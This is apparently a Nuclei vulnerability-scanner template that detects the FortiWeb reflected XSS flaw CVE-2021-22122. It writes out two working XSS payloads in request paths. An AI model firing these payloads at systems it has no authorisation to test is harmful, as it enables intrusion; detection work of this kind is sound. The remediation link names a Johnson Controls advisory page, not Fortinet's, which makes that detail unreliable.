id: CVE-2021-22122
info:
  name: FortiWeb v6.3.x-6.2.x Unauthenticated XSS
  author:
  - dwisiswant0
  description: |-
    Fortinet FortiWeb 跨站脚本漏洞
    Fortinet FortiWeb是美国飞塔（Fortinet）公司的一款Web应用层防火墙，它能够阻断如跨站点脚本、SQL注入、Cookie中毒、schema中毒等攻击的威胁，保证Web应用程序的安全性并保护敏感的数据库内容。

    FortiWeb 6.3.7 and below 和 versions 6.2.3 and below存在跨站脚本漏洞，该漏洞允许一个未经身份验证的远程攻击者执行反映跨站脚本攻击(XSS)。
  severity: medium
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://www.johnsoncontrols.com/cyber-solutions/security-advisories

    临时修复方案：
    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。'
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - nuclei
    - No policy has been chosen.
  matchers-condition: and
  path:
  - '{{BaseURL}}/error3?msg=30&data='';alert(''nuclei'');//'
  - '{{BaseURL}}/omni_success?cmdb_edit_path=");alert(''nuclei'');//'
  method: GET
